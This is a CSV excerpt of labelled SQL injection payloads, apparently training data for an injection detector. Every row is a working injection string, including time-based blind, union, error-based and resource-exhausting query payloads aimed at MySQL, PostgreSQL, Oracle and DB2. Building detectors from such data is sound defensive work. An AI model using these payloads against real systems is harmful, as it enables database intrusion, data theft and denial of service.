row_index,payload_norm,label,sqli_type_hint
1380,"1"" ) ) and 2006 = 2006",1,
1381,"1"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
1382,1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'wevl' = 'wevl,1,
1383,"-1425"" ) where 8056 = 8056 or elt ( 1032 = 1032,3623 ) --",1,
1384,1' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
1385,"1%' ) ) union all select null,null,null,null#",1,
1386,"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",1,
1387,"1'|| ( select 'hvqw' from dual where 4423 = 4423 union all select null,null,null--",1,
1388,end and ( ( 'eqoc' like 'eqoc,1,
1389,1' ) as lewd where 3118 = 3118 order by 1--,1,
1390,"-6076"" ) ) or 8277 = 4757",1,
1391,"1"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1,
1392,"-6680"" ) ) ) union all select 2564,2564,2564,2564,2564,2564#",1,
1393,1 ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
1394,1' ) as upgb where 2031 = 2031,1,
1395,"1' where 6795 = 6795 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
1396,"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'jjxn' = 'jjxn",1,
1397,select case when 2599 = 7035 then 1 else null end--,1,
1398,"1%' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and '%' = '",1,
1399,"1"" ) as eibf where 5026 = 5026 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",1,
1400,select ( case when ( 8403 = 7151 ) then 8403 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
1401,"1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
1402,"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) # fzni",1,
1403,1 ) where 9860 = 9860 and 4443 = 4111--,1,
1404,"1"" ) where 3122 = 3122 and sleep ( 5 ) #",1,
1405,"1"" ) ) as eglv where 7412 = 7412 union all select null#",1,
1406,1 and sleep ( 5 ) -- ruuv,1,
1407,1 ) rlike ( select ( case when ( 8488 = 1270 ) then 1 else 0x28 end ) ),1,
1408,"1%' union all select null,null,null#",1,
1409,"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'cimm' like 'cimm",1,
